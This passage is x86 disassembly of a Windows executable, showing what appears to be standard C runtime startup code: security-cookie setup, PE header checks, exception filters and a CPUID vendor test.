  40545b:	e8 e1 fe ff ff       	call   0x405341
  405460:	8b e5                	mov    %ebp,%esp
  405462:	5d                   	pop    %ebp
  405463:	c3                   	ret
  405464:	55                   	push   %ebp
  405465:	8b ec                	mov    %esp,%ebp
  405467:	8b 45 08             	mov    0x8(%ebp),%eax
  40546a:	56                   	push   %esi
  40546b:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40546e:	03 c8                	add    %eax,%ecx
  405470:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  405474:	8d 51 18             	lea    0x18(%ecx),%edx
  405477:	03 d0                	add    %eax,%edx
  405479:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  40547d:	6b f0 28             	imul   $0x28,%eax,%esi
  405480:	03 f2                	add    %edx,%esi
  405482:	3b d6                	cmp    %esi,%edx
  405484:	74 19                	je     0x40549f
  405486:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405489:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  40548c:	72 0a                	jb     0x405498
  40548e:	8b 42 08             	mov    0x8(%edx),%eax
  405491:	03 42 0c             	add    0xc(%edx),%eax
  405494:	3b c8                	cmp    %eax,%ecx
  405496:	72 0c                	jb     0x4054a4
  405498:	83 c2 28             	add    $0x28,%edx
  40549b:	3b d6                	cmp    %esi,%edx
  40549d:	75 ea                	jne    0x405489
  40549f:	33 c0                	xor    %eax,%eax
  4054a1:	5e                   	pop    %esi
  4054a2:	5d                   	pop    %ebp
  4054a3:	c3                   	ret
  4054a4:	8b c2                	mov    %edx,%eax
  4054a6:	eb f9                	jmp    0x4054a1
  4054a8:	e8 95 07 00 00       	call   0x405c42
  4054ad:	85 c0                	test   %eax,%eax
  4054af:	75 03                	jne    0x4054b4
  4054b1:	32 c0                	xor    %al,%al
  4054b3:	c3                   	ret
  4054b4:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  4054ba:	56                   	push   %esi
  4054bb:	be 80 83 40 00       	mov    $0x408380,%esi
  4054c0:	8b 50 04             	mov    0x4(%eax),%edx
  4054c3:	eb 04                	jmp    0x4054c9
  4054c5:	3b d0                	cmp    %eax,%edx
  4054c7:	74 10                	je     0x4054d9
  4054c9:	33 c0                	xor    %eax,%eax
  4054cb:	8b ca                	mov    %edx,%ecx
  4054cd:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  4054d1:	85 c0                	test   %eax,%eax
  4054d3:	75 f0                	jne    0x4054c5
  4054d5:	32 c0                	xor    %al,%al
  4054d7:	5e                   	pop    %esi
  4054d8:	c3                   	ret
  4054d9:	b0 01                	mov    $0x1,%al
  4054db:	5e                   	pop    %esi
  4054dc:	c3                   	ret
  4054dd:	55                   	push   %ebp
  4054de:	8b ec                	mov    %esp,%ebp
  4054e0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4054e4:	75 07                	jne    0x4054ed
  4054e6:	c6 05 9c 83 40 00 01 	movb   $0x1,0x40839c
  4054ed:	e8 ac 05 00 00       	call   0x405a9e
  4054f2:	e8 f3 07 00 00       	call   0x405cea
  4054f7:	84 c0                	test   %al,%al
  4054f9:	75 04                	jne    0x4054ff
  4054fb:	32 c0                	xor    %al,%al
  4054fd:	5d                   	pop    %ebp
  4054fe:	c3                   	ret
  4054ff:	e8 e6 07 00 00       	call   0x405cea
  405504:	84 c0                	test   %al,%al
  405506:	75 0a                	jne    0x405512
  405508:	6a 00                	push   $0x0
  40550a:	e8 db 07 00 00       	call   0x405cea
  40550f:	59                   	pop    %ecx
  405510:	eb e9                	jmp    0x4054fb
  405512:	b0 01                	mov    $0x1,%al
  405514:	5d                   	pop    %ebp
  405515:	c3                   	ret
  405516:	55                   	push   %ebp
  405517:	8b ec                	mov    %esp,%ebp
  405519:	83 ec 0c             	sub    $0xc,%esp
  40551c:	56                   	push   %esi
  40551d:	8b 75 08             	mov    0x8(%ebp),%esi
  405520:	85 f6                	test   %esi,%esi
  405522:	74 05                	je     0x405529
  405524:	83 fe 01             	cmp    $0x1,%esi
  405527:	75 7c                	jne    0x4055a5
  405529:	e8 14 07 00 00       	call   0x405c42
  40552e:	85 c0                	test   %eax,%eax
  405530:	74 2a                	je     0x40555c
  405532:	85 f6                	test   %esi,%esi
  405534:	75 26                	jne    0x40555c
  405536:	68 84 83 40 00       	push   $0x408384
  40553b:	e8 86 07 00 00       	call   0x405cc6
  405540:	59                   	pop    %ecx
  405541:	85 c0                	test   %eax,%eax
  405543:	74 04                	je     0x405549
  405545:	32 c0                	xor    %al,%al
  405547:	eb 57                	jmp    0x4055a0
  405549:	68 90 83 40 00       	push   $0x408390
  40554e:	e8 73 07 00 00       	call   0x405cc6
  405553:	f7 d8                	neg    %eax
  405555:	59                   	pop    %ecx
  405556:	1a c0                	sbb    %al,%al
  405558:	fe c0                	inc    %al
  40555a:	eb 44                	jmp    0x4055a0
  40555c:	a1 08 80 40 00       	mov    0x408008,%eax
  405561:	8d 75 f4             	lea    -0xc(%ebp),%esi
  405564:	57                   	push   %edi
  405565:	83 e0 1f             	and    $0x1f,%eax
  405568:	bf 84 83 40 00       	mov    $0x408384,%edi
  40556d:	6a 20                	push   $0x20
  40556f:	59                   	pop    %ecx
  405570:	2b c8                	sub    %eax,%ecx
  405572:	83 c8 ff             	or     $0xffffffff,%eax
  405575:	d3 c8                	ror    %cl,%eax
  405577:	33 05 08 80 40 00    	xor    0x408008,%eax
  40557d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405580:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405583:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405586:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405587:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405588:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405589:	bf 90 83 40 00       	mov    $0x408390,%edi
  40558e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405591:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405594:	8d 75 f4             	lea    -0xc(%ebp),%esi
  405597:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40559a:	b0 01                	mov    $0x1,%al
  40559c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40559d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40559e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40559f:	5f                   	pop    %edi
  4055a0:	5e                   	pop    %esi
  4055a1:	8b e5                	mov    %ebp,%esp
  4055a3:	5d                   	pop    %ebp
  4055a4:	c3                   	ret
  4055a5:	6a 05                	push   $0x5
  4055a7:	e8 20 01 00 00       	call   0x4056cc
  4055ac:	cc                   	int3
  4055ad:	6a 08                	push   $0x8
  4055af:	68 10 69 40 00       	push   $0x406910
  4055b4:	e8 67 04 00 00       	call   0x405a20
  4055b9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4055bd:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  4055c2:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  4055c9:	75 5d                	jne    0x405628
  4055cb:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4055d0:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  4055d7:	45 00 00 
  4055da:	75 4c                	jne    0x405628
  4055dc:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4055e1:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  4055e8:	75 3e                	jne    0x405628
  4055ea:	8b 45 08             	mov    0x8(%ebp),%eax
  4055ed:	b9 00 00 40 00       	mov    $0x400000,%ecx
  4055f2:	2b c1                	sub    %ecx,%eax
  4055f4:	50                   	push   %eax
  4055f5:	51                   	push   %ecx
  4055f6:	e8 69 fe ff ff       	call   0x405464
  4055fb:	59                   	pop    %ecx
  4055fc:	59                   	pop    %ecx
  4055fd:	85 c0                	test   %eax,%eax
  4055ff:	74 27                	je     0x405628
  405601:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  405605:	7c 21                	jl     0x405628
  405607:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40560e:	b0 01                	mov    $0x1,%al
  405610:	eb 1f                	jmp    0x405631
  405612:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405615:	8b 00                	mov    (%eax),%eax
  405617:	33 c9                	xor    %ecx,%ecx
  405619:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  40561f:	0f 94 c1             	sete   %cl
  405622:	8b c1                	mov    %ecx,%eax
  405624:	c3                   	ret
  405625:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405628:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40562f:	32 c0                	xor    %al,%al
  405631:	e8 30 04 00 00       	call   0x405a66
  405636:	c3                   	ret
  405637:	55                   	push   %ebp
  405638:	8b ec                	mov    %esp,%ebp
  40563a:	e8 03 06 00 00       	call   0x405c42
  40563f:	85 c0                	test   %eax,%eax
  405641:	74 0f                	je     0x405652
  405643:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  405647:	75 09                	jne    0x405652
  405649:	33 c0                	xor    %eax,%eax
  40564b:	b9 80 83 40 00       	mov    $0x408380,%ecx
  405650:	87 01                	xchg   %eax,(%ecx)
  405652:	5d                   	pop    %ebp
  405653:	c3                   	ret
  405654:	55                   	push   %ebp
  405655:	8b ec                	mov    %esp,%ebp
  405657:	80 3d 9c 83 40 00 00 	cmpb   $0x0,0x40839c
  40565e:	74 06                	je     0x405666
  405660:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  405664:	75 12                	jne    0x405678
  405666:	ff 75 08             	push   0x8(%ebp)
  405669:	e8 7c 06 00 00       	call   0x405cea
  40566e:	ff 75 08             	push   0x8(%ebp)
  405671:	e8 74 06 00 00       	call   0x405cea
  405676:	59                   	pop    %ecx
  405677:	59                   	pop    %ecx
  405678:	b0 01                	mov    $0x1,%al
  40567a:	5d                   	pop    %ebp
  40567b:	c3                   	ret
  40567c:	55                   	push   %ebp
  40567d:	8b ec                	mov    %esp,%ebp
  40567f:	a1 08 80 40 00       	mov    0x408008,%eax
  405684:	8b c8                	mov    %eax,%ecx
  405686:	33 05 84 83 40 00    	xor    0x408384,%eax
  40568c:	83 e1 1f             	and    $0x1f,%ecx
  40568f:	ff 75 08             	push   0x8(%ebp)
  405692:	d3 c8                	ror    %cl,%eax
  405694:	83 f8 ff             	cmp    $0xffffffff,%eax
  405697:	75 07                	jne    0x4056a0
  405699:	e8 34 06 00 00       	call   0x405cd2
  40569e:	eb 0b                	jmp    0x4056ab
  4056a0:	68 84 83 40 00       	push   $0x408384
  4056a5:	e8 22 06 00 00       	call   0x405ccc
  4056aa:	59                   	pop    %ecx
  4056ab:	f7 d8                	neg    %eax
  4056ad:	59                   	pop    %ecx
  4056ae:	1b c0                	sbb    %eax,%eax
  4056b0:	f7 d0                	not    %eax
  4056b2:	23 45 08             	and    0x8(%ebp),%eax
  4056b5:	5d                   	pop    %ebp
  4056b6:	c3                   	ret
  4056b7:	55                   	push   %ebp
  4056b8:	8b ec                	mov    %esp,%ebp
  4056ba:	ff 75 08             	push   0x8(%ebp)
  4056bd:	e8 ba ff ff ff       	call   0x40567c
  4056c2:	f7 d8                	neg    %eax
  4056c4:	59                   	pop    %ecx
  4056c5:	1b c0                	sbb    %eax,%eax
  4056c7:	f7 d8                	neg    %eax
  4056c9:	48                   	dec    %eax
  4056ca:	5d                   	pop    %ebp
  4056cb:	c3                   	ret
  4056cc:	55                   	push   %ebp
  4056cd:	8b ec                	mov    %esp,%ebp
  4056cf:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4056d5:	53                   	push   %ebx
  4056d6:	56                   	push   %esi
  4056d7:	6a 17                	push   $0x17
  4056d9:	e8 06 06 00 00       	call   0x405ce4
  4056de:	85 c0                	test   %eax,%eax
  4056e0:	74 05                	je     0x4056e7
  4056e2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4056e5:	cd 29                	int    $0x29
  4056e7:	33 f6                	xor    %esi,%esi
  4056e9:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4056ef:	68 cc 02 00 00       	push   $0x2cc
  4056f4:	56                   	push   %esi
  4056f5:	50                   	push   %eax
  4056f6:	89 35 a0 83 40 00    	mov    %esi,0x4083a0
  4056fc:	e8 53 05 00 00       	call   0x405c54
  405701:	83 c4 0c             	add    $0xc,%esp
  405704:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  40570a:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  405710:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  405716:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  40571c:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  405722:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  405728:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  40572f:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  405736:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  40573d:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  405744:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  40574b:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  405752:	9c                   	pushf
  405753:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  405759:	8b 45 04             	mov    0x4(%ebp),%eax
  40575c:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  405762:	8d 45 04             	lea    0x4(%ebp),%eax
  405765:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  40576b:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  405772:	00 01 00 
  405775:	8b 40 fc             	mov    -0x4(%eax),%eax
  405778:	6a 50                	push   $0x50
  40577a:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  405780:	8d 45 a8             	lea    -0x58(%ebp),%eax
  405783:	56                   	push   %esi
  405784:	50                   	push   %eax
  405785:	e8 ca 04 00 00       	call   0x405c54
  40578a:	8b 45 04             	mov    0x4(%ebp),%eax
  40578d:	83 c4 0c             	add    $0xc,%esp
  405790:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  405797:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  40579e:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4057a1:	ff 15 94 60 40 00    	call   *0x406094
  4057a7:	56                   	push   %esi
  4057a8:	8d 58 ff             	lea    -0x1(%eax),%ebx
  4057ab:	f7 db                	neg    %ebx
  4057ad:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4057b0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4057b3:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4057b9:	1a db                	sbb    %bl,%bl
  4057bb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057be:	fe c3                	inc    %bl
  4057c0:	ff 15 48 60 40 00    	call   *0x406048
  4057c6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4057c9:	50                   	push   %eax
  4057ca:	ff 15 4c 60 40 00    	call   *0x40604c
  4057d0:	85 c0                	test   %eax,%eax
  4057d2:	75 0d                	jne    0x4057e1
  4057d4:	0f b6 c3             	movzbl %bl,%eax
  4057d7:	f7 d8                	neg    %eax
  4057d9:	1b c0                	sbb    %eax,%eax
  4057db:	21 05 a0 83 40 00    	and    %eax,0x4083a0
  4057e1:	5e                   	pop    %esi
  4057e2:	5b                   	pop    %ebx
  4057e3:	8b e5                	mov    %ebp,%esp
  4057e5:	5d                   	pop    %ebp
  4057e6:	c3                   	ret
  4057e7:	55                   	push   %ebp
  4057e8:	8b ec                	mov    %esp,%ebp
  4057ea:	83 ec 44             	sub    $0x44,%esp
  4057ed:	6a 44                	push   $0x44
  4057ef:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4057f2:	6a 00                	push   $0x0
  4057f4:	50                   	push   %eax
  4057f5:	e8 5a 04 00 00       	call   0x405c54
  4057fa:	83 c4 0c             	add    $0xc,%esp
  4057fd:	8d 45 bc             	lea    -0x44(%ebp),%eax
  405800:	50                   	push   %eax
  405801:	ff 15 38 60 40 00    	call   *0x406038
  405807:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  40580b:	74 06                	je     0x405813
  40580d:	0f b7 45 ec          	movzwl -0x14(%ebp),%eax
  405811:	eb 03                	jmp    0x405816
  405813:	6a 0a                	push   $0xa
  405815:	58                   	pop    %eax
  405816:	8b e5                	mov    %ebp,%esp
  405818:	5d                   	pop    %ebp
  405819:	c3                   	ret
  40581a:	6a 00                	push   $0x0
  40581c:	ff 15 8c 60 40 00    	call   *0x40608c
  405822:	8b c8                	mov    %eax,%ecx
  405824:	85 c9                	test   %ecx,%ecx
  405826:	75 03                	jne    0x40582b
  405828:	32 c0                	xor    %al,%al
  40582a:	c3                   	ret
  40582b:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  405830:	66 39 01             	cmp    %ax,(%ecx)
  405833:	75 f3                	jne    0x405828
  405835:	8b 41 3c             	mov    0x3c(%ecx),%eax
  405838:	03 c1                	add    %ecx,%eax
  40583a:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  405840:	75 e6                	jne    0x405828
  405842:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  405847:	66 39 48 18          	cmp    %cx,0x18(%eax)
  40584b:	75 db                	jne    0x405828
  40584d:	83 78 74 0e          	cmpl   $0xe,0x74(%eax)
  405851:	76 d5                	jbe    0x405828
  405853:	83 b8 e8 00 00 00 00 	cmpl   $0x0,0xe8(%eax)
  40585a:	0f 95 c0             	setne  %al
  40585d:	c3                   	ret
  40585e:	68 6a 58 40 00       	push   $0x40586a
  405863:	ff 15 48 60 40 00    	call   *0x406048
  405869:	c3                   	ret
  40586a:	55                   	push   %ebp
  40586b:	8b ec                	mov    %esp,%ebp
  40586d:	8b 45 08             	mov    0x8(%ebp),%eax
  405870:	8b 00                	mov    (%eax),%eax
  405872:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  405878:	75 25                	jne    0x40589f
  40587a:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40587e:	75 1f                	jne    0x40589f
  405880:	8b 40 14             	mov    0x14(%eax),%eax
  405883:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  405888:	74 1b                	je     0x4058a5
  40588a:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40588f:	74 14                	je     0x4058a5
  405891:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  405896:	74 0d                	je     0x4058a5
  405898:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  40589d:	74 06                	je     0x4058a5
  40589f:	33 c0                	xor    %eax,%eax
  4058a1:	5d                   	pop    %ebp
  4058a2:	c2 04 00             	ret    $0x4
  4058a5:	e8 2e 04 00 00       	call   0x405cd8
  4058aa:	cc                   	int3
  4058ab:	ff 25 88 61 40 00    	jmp    *0x406188
  4058b1:	55                   	push   %ebp
  4058b2:	8b ec                	mov    %esp,%ebp
  4058b4:	83 ec 14             	sub    $0x14,%esp
  4058b7:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4058bb:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4058bf:	a1 08 80 40 00       	mov    0x408008,%eax
  4058c4:	56                   	push   %esi
  4058c5:	57                   	push   %edi
  4058c6:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  4058cb:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  4058d0:	3b c7                	cmp    %edi,%eax
  4058d2:	74 0d                	je     0x4058e1
  4058d4:	85 c6                	test   %eax,%esi
  4058d6:	74 09                	je     0x4058e1
  4058d8:	f7 d0                	not    %eax
  4058da:	a3 04 80 40 00       	mov    %eax,0x408004
  4058df:	eb 66                	jmp    0x405947
  4058e1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4058e4:	50                   	push   %eax
  4058e5:	ff 15 6c 60 40 00    	call   *0x40606c
  4058eb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4058ee:	33 45 f4             	xor    -0xc(%ebp),%eax
  4058f1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4058f4:	ff 15 30 60 40 00    	call   *0x406030
  4058fa:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4058fd:	ff 15 2c 60 40 00    	call   *0x40602c
  405903:	31 45 fc             	xor    %eax,-0x4(%ebp)
  405906:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405909:	50                   	push   %eax
  40590a:	ff 15 28 60 40 00    	call   *0x406028
  405910:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405913:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405916:	33 4d ec             	xor    -0x14(%ebp),%ecx
  405919:	33 4d fc             	xor    -0x4(%ebp),%ecx
  40591c:	33 c8                	xor    %eax,%ecx
  40591e:	3b cf                	cmp    %edi,%ecx
  405920:	75 07                	jne    0x405929
  405922:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  405927:	eb 10                	jmp    0x405939
  405929:	85 ce                	test   %ecx,%esi
  40592b:	75 0c                	jne    0x405939
  40592d:	8b c1                	mov    %ecx,%eax
  40592f:	0d 11 47 00 00       	or     $0x4711,%eax
  405934:	c1 e0 10             	shl    $0x10,%eax
  405937:	0b c8                	or     %eax,%ecx
  405939:	89 0d 08 80 40 00    	mov    %ecx,0x408008
  40593f:	f7 d1                	not    %ecx
  405941:	89 0d 04 80 40 00    	mov    %ecx,0x408004
  405947:	5f                   	pop    %edi
  405948:	5e                   	pop    %esi
  405949:	8b e5                	mov    %ebp,%esp
  40594b:	5d                   	pop    %ebp
  40594c:	c3                   	ret
  40594d:	33 c0                	xor    %eax,%eax
  40594f:	40                   	inc    %eax
  405950:	c3                   	ret
  405951:	33 c0                	xor    %eax,%eax
  405953:	c3                   	ret
  405954:	b8 00 40 00 00       	mov    $0x4000,%eax
  405959:	c3                   	ret
  40595a:	68 a8 83 40 00       	push   $0x4083a8
  40595f:	ff 15 3c 60 40 00    	call   *0x40603c
  405965:	c3                   	ret
  405966:	68 00 00 03 00       	push   $0x30000
  40596b:	68 00 00 01 00       	push   $0x10000
  405970:	6a 00                	push   $0x0
  405972:	e8 67 03 00 00       	call   0x405cde
  405977:	83 c4 0c             	add    $0xc,%esp
  40597a:	85 c0                	test   %eax,%eax
  40597c:	75 01                	jne    0x40597f
  40597e:	c3                   	ret
  40597f:	6a 07                	push   $0x7
  405981:	e8 46 fd ff ff       	call   0x4056cc
  405986:	cc                   	int3
  405987:	c3                   	ret
  405988:	b8 b0 83 40 00       	mov    $0x4083b0,%eax
  40598d:	c3                   	ret
  40598e:	b8 b8 83 40 00       	mov    $0x4083b8,%eax
  405993:	c3                   	ret
  405994:	e8 ef ff ff ff       	call   0x405988
  405999:	8b 48 04             	mov    0x4(%eax),%ecx
  40599c:	83 08 04             	orl    $0x4,(%eax)
  40599f:	89 48 04             	mov    %ecx,0x4(%eax)
  4059a2:	e8 e7 ff ff ff       	call   0x40598e
  4059a7:	8b 48 04             	mov    0x4(%eax),%ecx
  4059aa:	83 08 02             	orl    $0x2,(%eax)
  4059ad:	89 48 04             	mov    %ecx,0x4(%eax)
  4059b0:	c3                   	ret
  4059b1:	33 c0                	xor    %eax,%eax
  4059b3:	39 05 10 80 40 00    	cmp    %eax,0x408010
  4059b9:	0f 94 c0             	sete   %al
  4059bc:	c3                   	ret
  4059bd:	b8 d4 83 40 00       	mov    $0x4083d4,%eax
  4059c2:	c3                   	ret
  4059c3:	b8 d0 83 40 00       	mov    $0x4083d0,%eax
  4059c8:	c3                   	ret
  4059c9:	53                   	push   %ebx
  4059ca:	56                   	push   %esi
  4059cb:	be e0 68 40 00       	mov    $0x4068e0,%esi
  4059d0:	bb e0 68 40 00       	mov    $0x4068e0,%ebx
  4059d5:	3b f3                	cmp    %ebx,%esi
  4059d7:	73 18                	jae    0x4059f1
  4059d9:	57                   	push   %edi
  4059da:	8b 3e                	mov    (%esi),%edi
  4059dc:	85 ff                	test   %edi,%edi
  4059de:	74 09                	je     0x4059e9
  4059e0:	8b cf                	mov    %edi,%ecx
  4059e2:	e8 c4 fe ff ff       	call   0x4058ab
  4059e7:	ff d7                	call   *%edi
  4059e9:	83 c6 04             	add    $0x4,%esi
  4059ec:	3b f3                	cmp    %ebx,%esi
  4059ee:	72 ea                	jb     0x4059da
  4059f0:	5f                   	pop    %edi
  4059f1:	5e                   	pop    %esi
  4059f2:	5b                   	pop    %ebx
  4059f3:	c3                   	ret
  4059f4:	53                   	push   %ebx
  4059f5:	56                   	push   %esi
  4059f6:	be e8 68 40 00       	mov    $0x4068e8,%esi
  4059fb:	bb e8 68 40 00       	mov    $0x4068e8,%ebx
  405a00:	3b f3                	cmp    %ebx,%esi
  405a02:	73 18                	jae    0x405a1c
  405a04:	57                   	push   %edi
  405a05:	8b 3e                	mov    (%esi),%edi
  405a07:	85 ff                	test   %edi,%edi
  405a09:	74 09                	je     0x405a14
  405a0b:	8b cf                	mov    %edi,%ecx
  405a0d:	e8 99 fe ff ff       	call   0x4058ab
  405a12:	ff d7                	call   *%edi
  405a14:	83 c6 04             	add    $0x4,%esi
  405a17:	3b f3                	cmp    %ebx,%esi
  405a19:	72 ea                	jb     0x405a05
  405a1b:	5f                   	pop    %edi
  405a1c:	5e                   	pop    %esi
  405a1d:	5b                   	pop    %ebx
  405a1e:	c3                   	ret
  405a1f:	cc                   	int3
  405a20:	68 7b 5a 40 00       	push   $0x405a7b
  405a25:	64 ff 35 00 00 00 00 	push   %fs:0x0
  405a2c:	8b 44 24 10          	mov    0x10(%esp),%eax
  405a30:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  405a34:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  405a38:	2b e0                	sub    %eax,%esp
  405a3a:	53                   	push   %ebx
  405a3b:	56                   	push   %esi
  405a3c:	57                   	push   %edi
  405a3d:	a1 08 80 40 00       	mov    0x408008,%eax
  405a42:	31 45 fc             	xor    %eax,-0x4(%ebp)
  405a45:	33 c5                	xor    %ebp,%eax
  405a47:	50                   	push   %eax
  405a48:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405a4b:	ff 75 f8             	push   -0x8(%ebp)
  405a4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a51:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405a58:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a5b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405a5e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405a64:	f2 c3                	bnd ret
  405a66:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405a69:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405a70:	59                   	pop    %ecx
  405a71:	5f                   	pop    %edi
  405a72:	5f                   	pop    %edi
  405a73:	5e                   	pop    %esi
  405a74:	5b                   	pop    %ebx
  405a75:	8b e5                	mov    %ebp,%esp
  405a77:	5d                   	pop    %ebp
  405a78:	51                   	push   %ecx
  405a79:	f2 c3                	bnd ret
  405a7b:	55                   	push   %ebp
  405a7c:	8b ec                	mov    %esp,%ebp
  405a7e:	ff 75 14             	push   0x14(%ebp)
  405a81:	ff 75 10             	push   0x10(%ebp)
  405a84:	ff 75 0c             	push   0xc(%ebp)
  405a87:	ff 75 08             	push   0x8(%ebp)
  405a8a:	68 c4 4e 40 00       	push   $0x404ec4
  405a8f:	68 08 80 40 00       	push   $0x408008
  405a94:	e8 c1 01 00 00       	call   0x405c5a
  405a99:	83 c4 18             	add    $0x18,%esp
  405a9c:	5d                   	pop    %ebp
  405a9d:	c3                   	ret
  405a9e:	55                   	push   %ebp
  405a9f:	8b ec                	mov    %esp,%ebp
  405aa1:	83 25 c0 83 40 00 00 	andl   $0x0,0x4083c0
  405aa8:	83 ec 2c             	sub    $0x2c,%esp
  405aab:	53                   	push   %ebx
  405aac:	33 db                	xor    %ebx,%ebx
  405aae:	43                   	inc    %ebx
  405aaf:	09 1d 20 80 40 00    	or     %ebx,0x408020
  405ab5:	6a 0a                	push   $0xa
  405ab7:	e8 28 02 00 00       	call   0x405ce4
  405abc:	85 c0                	test   %eax,%eax
  405abe:	0f 84 77 01 00 00    	je     0x405c3b
  405ac4:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405ac8:	33 c0                	xor    %eax,%eax
  405aca:	83 0d 20 80 40 00 02 	orl    $0x2,0x408020
  405ad1:	33 c9                	xor    %ecx,%ecx
  405ad3:	56                   	push   %esi
  405ad4:	57                   	push   %edi
  405ad5:	89 1d c0 83 40 00    	mov    %ebx,0x4083c0
  405adb:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  405ade:	53                   	push   %ebx
  405adf:	0f a2                	cpuid
  405ae1:	8b f3                	mov    %ebx,%esi
  405ae3:	5b                   	pop    %ebx
  405ae4:	89 07                	mov    %eax,(%edi)
  405ae6:	89 77 04             	mov    %esi,0x4(%edi)
  405ae9:	89 4f 08             	mov    %ecx,0x8(%edi)
  405aec:	33 c9                	xor    %ecx,%ecx
  405aee:	89 57 0c             	mov    %edx,0xc(%edi)
  405af1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405af4:	8b 7d d8             	mov    -0x28(%ebp),%edi
  405af7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405afa:	81 f7 47 65 6e 75    	xor    $0x756e6547,%edi
  405b00:	8b 45 e0             	mov    -0x20(%ebp),%eax
